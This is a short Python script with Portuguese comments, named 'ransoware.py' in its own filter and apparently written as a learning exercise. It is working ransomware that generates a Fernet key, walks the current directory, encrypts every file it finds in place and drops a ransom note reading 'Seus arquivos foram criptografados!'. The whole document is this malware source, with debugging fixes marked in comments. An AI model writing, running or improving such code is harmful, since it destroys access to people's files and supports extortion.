from cryptography.fernet import Fernet
import os

# 1. Gerar chave
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# 2. Carregar chave
def carregar_chave():
    return open("chave.key", "rb").read()

# 3. Criptografar arquivo
def criptografar_arquivo(arquivo, chave):
    print(f"Criptografando: {arquivo}")  # DEBUG: Mostra qual arquivo está sendo processado
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

# 4. Encontrar arquivos
def encontrar_arquivos(diretorio):
    lista = []
    # os.walk percorre o diretório
    for raiz, _, arquivos in os.walk(diretorio):
        # PROTEÇÃO: Pula a pasta venv para não quebrar o Python
        if "venv" in raiz:
            continue
            
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            # Filtra para não criptografar o próprio script ou a chave
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    
    return lista  # <--- CORREÇÃO 1: Retorna a lista cheia

# 5. Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")

# 6. Principal
def main():
    gerar_chave()
    chave = carregar_chave()
    
    # CORREÇÃO 2: Usa "." para indicar a pasta atual
    arquivos = encontrar_arquivos(".") 
    
    print(f"Arquivos encontrados: {arquivos}") # DEBUG: Mostra o que ele achou
    
    if not arquivos:
        print("AVISO: Nenhum arquivo encontrado para criptografar!")
    
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
        
    criar_mensagem_resgate()
    print("Ransomware executado!")

if __name__=="__main__":
    main()